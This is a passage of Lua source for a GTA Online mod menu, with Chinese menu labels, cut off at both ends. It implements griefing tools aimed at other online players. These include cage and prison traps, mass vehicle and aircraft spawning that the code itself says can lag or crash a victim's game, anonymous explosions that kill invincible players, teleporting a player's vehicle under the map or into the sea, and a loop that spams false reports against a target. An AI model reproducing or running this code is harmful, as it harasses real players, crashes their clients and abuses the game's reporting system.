	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z + .25, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z + .25, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z + .25, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z + .25, true, true, false) -- right

	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	util.yield(15)
	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	rot.y = 90

	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)

	menu.action(cage_options, "特技管", {"stuntcage"}, "", function()
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
		STREAMING.REQUEST_MODEL(2081936690)

		while not STREAMING.HAS_MODEL_LOADED(2081936690) do		
			util.yield()
		end
		local cage_object = OBJECT.CREATE_OBJECT(2081936690, pos.x, pos.y, pos.z, true, true, false)
		cages[#cages + 1] = cage_object
		util.yield(15)
		local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
		rot.y = 90
		ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
	end)
							
	local cage_loop = false
	menu.toggle(cage_options, "新世纪全自动化套笼", {"autocage"}, "", function(on)
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local a = ENTITY.GET_ENTITY_COORDS(player_ped) --first position
		cage_loop = on
		if cage_loop then
			if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
				menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." on")
				util.yield(300)
				if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
					notification("Failed to kick player out of the vehicle", colors.red)
					menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
					return
				end
				menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
				a =  ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
			end
			cage_player(a)
		end
		while cage_loop do
			local b = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) --current position
			local ba = {x = b.x - a.x, y = b.y - a.y, z = b.z - a.z} 
			if math.sqrt(ba.x * ba.x + ba.y * ba.y + ba.z * ba.z) >= 4 then --now I know there's a native to find distance between coords but I like this >_<
				a = b
				if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
					goto continue
				end
				cage_player(a)
				notification(PLAYER.GET_PLAYER_NAME(pid).." was out of the cage. Doing it again", colors.black)
				::continue::
			end
			util.yield(1000)
		end
	end)

	menu.action(cage_options, "删掉笼子", {"release"}, "", function() -- ez fix but lazy
		for key, value in pairs(cages) do
			entities.delete_by_handle(value)
		end
	end)
	
	pan = menu.list(griefing, "炸鱼", {}, "")
	 Ptools_PanTable = {}
    Ptools_PanCount = 1
    Ptools_FishPan = 20
	menu.action(pan, "炸鱼", {}, "", function()
	menu.trigger_commands("anticrashcam on")
	 local targetped = PLAYER.GET_PLAYER_PED(pid)
        local targetcoords = ENTITY.GET_ENTITY_COORDS(targetped)

        local hash = util.joaat("tug")
        STREAMING.REQUEST_MODEL(hash)
        while not STREAMING.HAS_MODEL_LOADED(hash) do util.yield() end

        for i = 1, Ptools_FishPan do
            Ptools_PanTable[Ptools_PanCount] = VEHICLE.CREATE_VEHICLE(hash, targetcoords.x, targetcoords.y, targetcoords.z, 0, true, true, true)
            ----
            local netID = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(Ptools_PanTable[Ptools_PanCount])
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(Ptools_PanTable[Ptools_PanCount])
            NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(netID)
            NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netID)
            NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netID, false)
            NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(netID, pid, true)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Ptools_PanTable[Ptools_PanCount], true, false)
            ENTITY.SET_ENTITY_VISIBLE(Ptools_PanTable[Ptools_PanCount], false, 0)
            ----
            if SE_Notifications then
                util.toast("Spawned with index of " .. Ptools_PanCount)
            end
            Ptools_PanCount = Ptools_PanCount + 1
        end
    end)

    menu.slider(pan, "鱼", {"friedfish"}, "The number of flippity flops", 1, 300, 20, 1, function(value)
        Ptools_FishPan = value
    end)

    menu.action(pan, "移除", {"rmpan"}, "Yep", function ()
        for x = 1, 5, 1 do
            for i = 1, #Ptools_PanTable do
                entities.delete_by_handle(Ptools_PanTable[i])
                util.yield(10)
            end
        end
        --
        Ptools_PanCount = 1
        Ptools_PanTable = {}
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(util.joaat("tug"))
		util.yield(800)
		menu.trigger_commands("anticrashcam off")
    end)

	menu.action(griefing,"刷飞机", {}, "很卡，有概率崩掉对方", function() -- cpu burn simulator v2
		while not STREAMING.HAS_MODEL_LOADED(447548909) do
			STREAMING.REQUEST_MODEL(447548909)
			util.yield(10)
		end
		local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        local OldCoords = ENTITY.GET_ENTITY_COORDS(self_ped)
		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, 24, 7643.5, 19, true, true, true)

		notification("Started lagging the fuck out of him", colors.black)
		menu.trigger_commands("anticrashcamera on")
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
		spam_amount = 300
		while spam_amount >= 1 do
			entities.create_vehicle(447548909, PlayerPedCoords, 0)
			spam_amount = spam_amount - 1
			util.yield(10)
		end
		notification("Done", colors.green)
		menu.trigger_commands("anticrashcamera off")
	end)


	menu.action(griefing,"拉走", {}, "", function()
		V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

		if table_kidnap == nil then
			table_kidnap = {}
		end

        hash = util.joaat("stockade")
        ped_hash = util.joaat("MP_M_Cocaine_01")

        if STREAMING.IS_MODEL_A_VEHICLE(hash) then
            STREAMING.REQUEST_MODEL(hash)

            while not STREAMING.HAS_MODEL_LOADED(hash) do
                util.yield()
            end

            coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)

            local aab = 
			{
				x = -5784.258301,
				y = -8289.385742,
				z = -136.411270
			}

            ENTITY.SET_ENTITY_VISIBLE(ped_to_kidnap, false)
            ENTITY.FREEZE_ENTITY_POSITION(ped_to_kidnap, true)

            table_kidnap[veh_to_attach] = entities.create_vehicle(hash, ENTITY.GET_ENTITY_COORDS(V3, true),
            CAM.GET_FINAL_RENDERED_CAM_ROT(0).z)
            while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
                STREAMING.REQUEST_MODEL(ped_hash)
                util.yield()
            end
            ped_to_kidnap = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
            ped_to_drive = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)

            ENTITY.SET_ENTITY_INVINCIBLE(ped_to_drive, true)
            ENTITY.SET_ENTITY_INVINCIBLE(table_kidnap[veh_to_attach], true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(table_kidnap[veh_to_attach], ped_to_kidnap, 0, 0, 1, -1, 0, 0, 0, false,
                true, true, false, 0, false)
            ENTITY.SET_ENTITY_COORDS(ped_to_kidnap, coords_ped.x, coords_ped.y, coords_ped.z - 1, false, false, false,
                false)
            PED.SET_PED_INTO_VEHICLE(ped_to_drive, table_kidnap[veh_to_attach], -1)
            TASK.TASK_VEHICLE_DRIVE_WANDER(ped_to_drive, table_kidnap[veh_to_attach], 20, 16777216)

            util.yield(500)

            entities.delete_by_handle(ped_to_kidnap)
            veh_to_attach = veh_to_attach + 1

            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(ped_hash)

        end
	end)

	menu.toggle(griefing,"循环举报", {}, "", function(on)
		spam = on
		while spam do
			if pid ~= players.user() then
				menu.trigger_commands("reportvcannoying " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportvchate " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportannoying " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reporthate " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportexploits " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportbugabuse " .. PLAYER.GET_PLAYER_NAME(pid))
			end
			util.yield()
		end
	end)

	crashes = menu.list(prank, "CPU", {}, "", function(); end)

    menu.action(crashes,"CPU", {}, "", function()
		while not STREAMING.HAS_MODEL_LOADED(447548909) do
			STREAMING.REQUEST_MODEL(447548909)
			util.yield(10)
		end
		local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        local OldCoords = ENTITY.GET_ENTITY_COORDS(self_ped)
		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, 24, 7643.5, 19, true, true, true)

		menu.trigger_commands("anticrashcamera on")
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
		spam_amount = 300
		while spam_amount >= 1 do
			entities.create_vehicle(447548909, PlayerPedCoords, 0)
			spam_amount = spam_amount - 1
			util.yield(10)
		end
		menu.trigger_commands("anticrashcamera off")
	end)

	action(explosions, "匿名爆炸", {}, "", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(p)
		FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
	end)

	action(explosions, "爆炸", {}, "", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(p)
		FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), c.x, c.y, c.z, exp, 100.0, true, false, 1.0)
	end)

	toggleloop(explosions, "循环匿名爆炸", {}, "", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(p)
		FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
	end)

	toggleloop(explosions, "循环爆炸", {}, "", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(p)
		FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), c.x, c.y, c.z, exp, 100.0, true, false, 1.0)
	end)

	action(explosions, "虚假爆炸", {}, "爆炸不会造成伤害", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(p)
		FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 0.0, true, false, 1.0, false)
	end)

	action(explosions, "外星人爆炸", {"ufo"}, "模拟外星人入侵", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(p)
		STREAMING.REQUEST_MODEL(ufo)
		while not STREAMING.HAS_MODEL_LOADED(ufo) do
			STREAMING.REQUEST_MODEL(ufo)
			util.yield()
		end
		menu.trigger_commands("freeze".. players.get_name(pid).. " on")
		c.z = c.z + 10
		local spawnedufo = entities.create_object(ufo, c)
		util.yield(2000)
		c = ENTITY.GET_ENTITY_COORDS(p)
		FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 3.0, false)
		util.yield(1000)
		entities.delete_by_handle(spawnedufo)
		menu.trigger_commands("freeze".. players.get_name(pid).. " off")
		util.toast("Done :)")
	end)

	action(explosions, "匿名杀死无敌玩家", {}, "", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(p)
		menu.trigger_commands("confuse".. players.get_name(pid).. " on")
		util.yield(10)
		FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
		util.yield(10)
		menu.trigger_commands("confuse".. players.get_name(pid).. " off")
		util.toast("Done :)")
	end)

	action(explosions, "杀死无敌玩家", {}, "", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(p)
		menu.trigger_commands("confuse".. players.get_name(pid).. " on")
		util.yield(10)
		FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
		util.yield(10)
		menu.trigger_commands("confuse".. players.get_name(pid).. " off")
		util.toast("Done :)")
	end)
	
	local cage1 = {}
	local cage2 = {}
	local door1 = {}
	local door2 = {}
	local door3 = {}
	local door4 = {}
	local sinmate = {}

	action(cages, "笼子", {}, "", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(p)
		STREAMING.REQUEST_MODEL(cage)
		while not STREAMING.HAS_MODEL_LOADED(cage) do
			STREAMING.REQUEST_MODEL(cage)
			util.yield()
		end
		if not STREAMING.HAS_MODEL_LOADED(cage) then
			util.toast("模型无法加载")
		end
		TASK.CLEAR_PED_TASKS_IMMEDIATELY(p)
		if PED.IS_PED_IN_ANY_VEHICLE(p) then return end
		cage1 [#cage1 + 1] = entities.create_object(cage, c)
		ENTITY.FREEZE_ENTITY_POSITION(cage1[#cage1], true)
	end)

	action(cages, "隐形笼子", {}, "", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(p)
		STREAMING.REQUEST_MODEL(cage)
		while not STREAMING.HAS_MODEL_LOADED(cage) do
			STREAMING.REQUEST_MODEL(cage)
			util.yield()
		end
		if not STREAMING.HAS_MODEL_LOADED(cage) then
			util.toast("模型无法加载")
		end
		TASK.CLEAR_PED_TASKS_IMMEDIATELY(p)
		if PED.IS_PED_IN_ANY_VEHICLE(p) then return end
		cage2 [#cage2 + 1] = entities.create_object(cage, c)
		ENTITY.SET_ENTITY_VISIBLE(cage2[#cage2], false, 0)
		ENTITY.FREEZE_ENTITY_POSITION(cage2[#cage2], true)
	end)

	action(cages, "监狱", {}, "玩家与另一名囚犯困在监狱牢房中", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(p)
		c.y = c.y + 0.5
		c.x = c.x + 0.5
		STREAMING.REQUEST_MODEL(door)
		while not STREAMING.HAS_MODEL_LOADED(door) do
			STREAMING.REQUEST_MODEL(door)
			util.yield()
		end
		if not STREAMING.HAS_MODEL_LOADED(door) then
			util.toast("模型无法加载")
		end
		TASK.CLEAR_PED_TASKS_IMMEDIATELY(p)
		if PED.IS_PED_IN_ANY_VEHICLE(p) then return end

		door1 [#door1 + 1] = entities.create_object(door, c)
		ENTITY.FREEZE_ENTITY_POSITION(door1[#door1], true)

		c = ENTITY.GET_ENTITY_COORDS(p)
		c.y = c.y - 0.8
		c.x = c.x + 0.5
		door2 [#door2 + 1] = entities.create_object(door, c)
		ENTITY.FREEZE_ENTITY_POSITION(door2[#door2], true)

		c = ENTITY.GET_ENTITY_COORDS(p)
		c.x = c.x + 0.5
		c.y = c.y + 0.5
		door3 [#door3 + 1] = entities.create_object(door, c)
		ENTITY.SET_ENTITY_ROTATION(door3[#door3], 0.0, 0.0, 90.0, 1, true)
		ENTITY.FREEZE_ENTITY_POSITION(door3[#door3], true)

		c = ENTITY.GET_ENTITY_COORDS(p)
		c.y = c.y + 0.5
		c.x = c.x - 0.8
		door4 [#door4 + 1] = entities.create_object(door, c)
		ENTITY.SET_ENTITY_ROTATION(door4[#door4], 0.0, 0.0, 90.0, 1, true)
		ENTITY.FREEZE_ENTITY_POSITION(door4[#door4], true)

		local c = ENTITY.GET_ENTITY_COORDS(p)
		STREAMING.REQUEST_MODEL(inmate)
		while not STREAMING.HAS_MODEL_LOADED(inmate) do
			STREAMING.REQUEST_MODEL(inmate)
			util.yield()
		end
		if not STREAMING.HAS_MODEL_LOADED(inmate) then
			util.toast("模型无法加载")
		end
		util.yield(100)
		sinmate [#sinmate + 1] = entities.create_ped(26, inmate, c, 0)
	end)

	action(cages, "清除笼子", {}, "", function()
		for i = 1, #cage1 do
			entities.delete_by_handle(cage1[i])
			cage1[i] = nil
		end

		for i = 1, #cage2 do
			entities.delete_by_handle(cage2[i])
			cage2[i] = nil
		end
	end)

	action(cages, "清除监狱", {}, "", function()
		for i = 1, #door1 do
			entities.delete_by_handle(door1[i])
			door1[i] = nil
		end

		for i = 1, #door2 do
			entities.delete_by_handle(door2[i])
			door2[i] = nil
		end

		for i = 1, #door3 do
			entities.delete_by_handle(door3[i])
			door3[i] = nil
		end

		for i = 1, #door4 do
			entities.delete_by_handle(door4[i])
			door4[i] = nil
		end

		for i = 1, #sinmate do
			entities.delete_by_handle(sinmate[i])
			sinmate[i] = nil
		end
	end)


	function RequestControl(entity)
		local tick = 0
		while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) and tick < 100000 do
			util.yield()
			NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
			tick = tick + 1
		end
	end

	action(player_vehicle, "坡道", {}, "在玩家载具前生成坡道", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, 0.5, 11, -1)
		local rot = ENTITY.GET_ENTITY_ROTATION(p, 5)
		rot.x = 0
		rot.y = 0
		rot.z = rot.z + 90
		if PED.IS_PED_IN_ANY_VEHICLE(p, true) then
			STREAMING.REQUEST_MODEL(ramp)
			while not STREAMING.HAS_MODEL_LOADED(ramp) do
				STREAMING.REQUEST_MODEL(ramp)
				util.yield()
			end
			local spawnedramp = entities.create_object(ramp, c)
			ENTITY.SET_ENTITY_ROTATION(spawnedramp, rot.x, rot.y, rot.z, 1, true)
			if not STREAMING.HAS_MODEL_LOADED(ramp) then
				util.toast("无法加载模型!")
			end
		else
			util.toast(players.get_name(pid).. " 不在载具内")
		end
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, 4, 11, -1)
		local rot = ENTITY.GET_ENTITY_ROTATION(p, 5)
		rot.x = 0
		rot.y = 0
		rot.z = rot.z + 90
		if PED.IS_PED_IN_ANY_VEHICLE(p, true) then
			STREAMING.REQUEST_MODEL(ramp)
			while not STREAMING.HAS_MODEL_LOADED(ramp) do
				STREAMING.REQUEST_MODEL(ramp)
				util.yield()
			end
			local spawnedramp = entities.create_object(ramp, c)
			ENTITY.SET_ENTITY_ROTATION(spawnedramp, rot.x, rot.y, rot.z, 1, true)
			if not STREAMING.HAS_MODEL_LOADED(ramp) then
				util.toast("无法加载模型!")
			end
		else
			util.toast(players.get_name(pid).. " 不在载具内")
		end
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, -3, 11, -1)
		local rot = ENTITY.GET_ENTITY_ROTATION(p, 5)
		rot.x = 0
		rot.y = 0
		rot.z = rot.z + 90
		if PED.IS_PED_IN_ANY_VEHICLE(p, true) then
			STREAMING.REQUEST_MODEL(ramp)
			while not STREAMING.HAS_MODEL_LOADED(ramp) do
				STREAMING.REQUEST_MODEL(ramp)
				util.yield()
			end
			local spawnedramp = entities.create_object(ramp, c)
			ENTITY.SET_ENTITY_ROTATION(spawnedramp, rot.x, rot.y, rot.z, 1, true)
			if not STREAMING.HAS_MODEL_LOADED(ramp) then
				util.toast("无法加载模型!")
			end
		else
			util.toast(players.get_name(pid).. " 不在载具内")
		end
	end)

	action(player_vehicle, "墙", {}, "在玩家载具前生成一堵墙", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, 0, 5, -1)
		local rot = ENTITY.GET_ENTITY_ROTATION(p, 5)
		rot.x = 0
		rot.y = 0
		rot.z = rot.z + 180
		if PED.IS_PED_IN_ANY_VEHICLE(p, true) then
			STREAMING.REQUEST_MODEL(wall)
			while not STREAMING.HAS_MODEL_LOADED(wall) do
				STREAMING.REQUEST_MODEL(wall)
				util.yield()
			end
			local spawnedwall = entities.create_object(wall, c)
			ENTITY.SET_ENTITY_ROTATION(spawnedwall, rot.x, rot.y, rot.z, 1, true)
			util.yield(5000)
			entities.delete_by_handle(spawnedwall)
			if not STREAMING.HAS_MODEL_LOADED(wall) then
				util.toast("无法加载模型!")
			end
		else
			util.toast(players.get_name(pid).. " 不在载具内")
		end
	end)

	action(player_vehicle, "传送到地图下方", {}, "", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(p)
		local veh = PED.GET_VEHICLE_PED_IS_IN(p, false)
		c.z = c.z - 100
		if PED.IS_PED_IN_ANY_VEHICLE(p, false) then
			local success, floorcoords
			repeat
				success, floorcoords = util.get_ground_z(c.x, c.y)
				util.yield()
			until success
			RequestControl(veh)
			floorcoords = floorcoords - 50
			ENTITY.SET_ENTITY_COORDS(veh, c.x, c.y, floorcoords, false, false, false, false)
		else
			util.toast(players.get_name(pid).. " 不在载具内")
		end
	end)

	action(player_vehicle, "传送到高空上", {}, "", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(p)
		local veh = PED.GET_VEHICLE_PED_IS_IN(p, false)
		c.z = c.z + 1500
		if PED.IS_PED_IN_ANY_VEHICLE(p, false) then
			RequestControl(veh)
			ENTITY.SET_ENTITY_COORDS(veh, c.x, c.y, c.z, false, false, false, false)
		else
			util.toast(players.get_name(pid).. " 不在载具内")
		end
	end)

	action(player_vehicle, "传送到大海里", {}, "", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local veh = PED.GET_VEHICLE_PED_IS_IN(p, false)
		if PED.IS_PED_IN_ANY_VEHICLE(p, false) then
			RequestControl(veh)
			ENTITY.SET_ENTITY_COORDS(veh, -2247.1692, -1903.4473, 3, false, false, false, false)
		else
			util.toast(players.get_name(pid).. " 不在载具内")
		end
	end)

	action(player_vehicle, "传送到监狱里", {}, "", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local veh = PED.GET_VEHICLE_PED_IS_IN(p, false)
		if PED.IS_PED_IN_ANY_VEHICLE(p, false) then
			RequestControl(veh)
			ENTITY.SET_ENTITY_COORDS(veh, 1652.5746, 2569.7756, 45.564854, false, false, false, false)
		else
			util.toast(players.get_name(pid).. " 不在载具内")
		end
	end)

	action(player_vehicle, "传送到密室里", {}, "", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(p)
		local defx = c.x
		local defy = c.y 
		local defz = c.z
		local veh = PED.GET_VEHICLE_PED_IS_IN(p, true)
		if PED.IS_PED_IN_ANY_VEHICLE(p, false) then
			STREAMING.REQUEST_MODEL(floorbr)
			while not STREAMING.HAS_MODEL_LOADED(floorbr) do
				STREAMING.REQUEST_MODEL(floorbr)
				util.yield()
			end
			STREAMING.REQUEST_MODEL(wallbr)
			while not STREAMING.HAS_MODEL_LOADED(wallbr) do
				STREAMING.REQUEST_MODEL(wallbr)
				util.yield()
			end
			RequestControl(veh)
			local success, floorcoords
			repeat
				success, floorcoords = util.get_ground_z(c.x, c.y)
				util.yield()
			until success
			c.z = floorcoords - 100
			ENTITY.SET_ENTITY_COORDS(veh, c.x, c.y, c.z, false, false, false, false)

			local c = ENTITY.GET_ENTITY_COORDS(p)
			local defz = c.z
			c.z = defz - 2
			local spawnedfloorbr = entities.create_object(floorbr, c)
			c.z = c.z + 10
			local spawnedroofbr = entities.create_object(floorbr, c)
			ENTITY.SET_ENTITY_ROTATION(spawnedroofbr, 180.0, 0.0, 0.0, 1, true)

			defz = c.z - 5
			c.x = c.x + 4
			c.z = defz
			local spawnedwall = entities.create_object(wallbr, c)
			ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
			OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

			c.x = c.x - 8
			local spawnedwall = entities.create_object(wallbr, c)
			ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
			OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

			c.y = c.y - 8
			c.x = defx + 10.5
			local spawnedwall = entities.create_object(wallbr, c)
			ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
			OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

			local spawnedwall = entities.create_object(wallbr, c)
			ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
			OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

			c.y = c.y - 14.5
			local spawnedwall = entities.create_object(wallbr, c)
			ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
			OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

			c.y = c.y - 7.2
			c.x = defx + 3.5
			local spawnedwall = entities.create_object(wallbr, c)
			ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
			OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

			c.y = defy + 6.5
			c.x = defx + 11
			local spawnedwall = entities.create_object(wallbr, c)
			ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
			OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

			c.x = defx - 12
			c.y = defy + 4
			local spawnedwall = entities.create_object(wallbr, c)
			ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
			OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

			c.y = defy - 7
			local spawnedwall = entities.create_object(wallbr, c)
			ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
			OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

			c.y = c.y - 10
			local spawnedwall = entities.create_object(wallbr, c)
			ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
			OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

			c.y = c.y - 7
			local spawnedwall = entities.create_object(wallbr, c)
			ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
			OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

			c.y = defy - 10
			c.x = defx - 19
			local spawnedwall = entities.create_object(wallbr, c)
			ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
			OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

			c.x = defx - 3
			c.y = defy + 6.5
			local spawnedwall = entities.create_object(wallbr, c)
			ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
			OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

			c.x = defx + 25
			local spawnedwall = entities.create_object(wallbr, c)
			ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
			OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

			c.x = c.x + 7
			c.y = defy
			local spawnedwall = entities.create_object(wallbr, c)
			ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
			OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

			c.y = defy - 14.5
			local spawnedwall = entities.create_object(wallbr, c)
			ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
			OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

			c.y = c.y - 7
			c.x = c.x - 7
			local spawnedwall = entities.create_object(wallbr, c)
			ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
			OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

			c.y = c.y - 7
			local spawnedwall = entities.create_object(wallbr, c)
			ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
			OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

			c.y = c.y - 7
			c.x = c.x - 7.5
			local spawnedwall = entities.create_object(wallbr, c)
